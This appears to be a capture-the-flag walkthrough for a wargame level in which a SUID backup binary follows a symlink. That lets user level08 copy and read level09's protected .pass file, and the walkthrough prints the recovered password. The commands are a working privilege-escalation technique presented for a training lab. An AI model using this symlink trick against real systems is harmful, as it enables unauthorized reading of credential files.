# Level 08 — Practical walkthrough

> 🔓 **Flaw:** the backup tool opens the source file with `level09`'s rights and copies it somewhere we can read
> 🎯 **Target:** `/home/users/level09/.pass`
> 🛠️ **Technique:** point the tool at a **symlink** to the `.pass` so it backs the secret up into `./backups/`.

All commands are run as user `level08`. This binary is **64-bit**.

## 1. Observe the program

🟦 **Goal:** confirm ownership and what the tool does.

🟨 **Terminal:**

```bash
ls -l
ls -la backups/
./level08
```

⬜ **Output (excerpt):**

```text
drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08
-rwxrwx---+ 1 level09 users     0 Oct 19  2016 backups/.log
Usage: ./level08 filename
```

`level08` and `backups/` are owned by `level09`; the binary is SUID `level09`, and `backups/`
is group-writable (we're in group `users`).

🟨 **Terminal:** (see it copy a file)

```bash
echo "oh hi" > hi
./level08 hi
cat backups/hi
```

⬜ **Output:**

```text
oh hi
```

## 2. Understand the flow

🟦 **Goal:** find why we can't just back up the `.pass` directly.

🟨 **Terminal:**

```bash
gdb ./level08
```

🟨 **GDB:**

```gdb
info functions
disassemble main
```

`info functions` lists the program's own functions (ignore the `@plt` libc stubs) — here it
reveals `log_wrapper` alongside `main`. The names also appear on the `call ... <name>` lines
inside `main`.

Reconstructing `main`:

- Opens `argv[1]` for reading with **`level09`'s rights** (it's SUID).
- Builds the destination as `"./backups/" + argv[1]` and copies the bytes there.

So passing an absolute path fails — the prefix mangles it into `./backups//home/...`:

🟨 **Terminal:**

```bash
./level08 /home/users/level09/.pass
```

⬜ **Output:**

```text
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The destination has directories that don't exist. We need a **plain filename** that still
*reads* from the protected `.pass`.

## 3. Exploit with a symlink

🟦 **Goal:** create a symlink whose name is a simple filename but whose target is the `.pass`.
`fopen(argv[1], "r")` follows the link (as `level09`), while the destination stays a tidy
`./backups/<name>`.

🟨 **Terminal:**

```bash
ln -s /home/users/level09/.pass password
./level08 password
cat backups/password
```

⬜ **Output:**

```text
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

The tool read the real `.pass` through the symlink and wrote a copy to `backups/password`,
which we own and can read.

> Alternative: from a writable dir like `/tmp`, recreate the path skeleton
> (`mkdir -p ./backups/home/users/level09`) and run `level08` with the full path so the
> destination resolves. The symlink is cleaner.

## 4. Move to the next level

🟨 **Terminal:**

```bash
su level09
```

(Enter the password above.) Then:

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level09
```
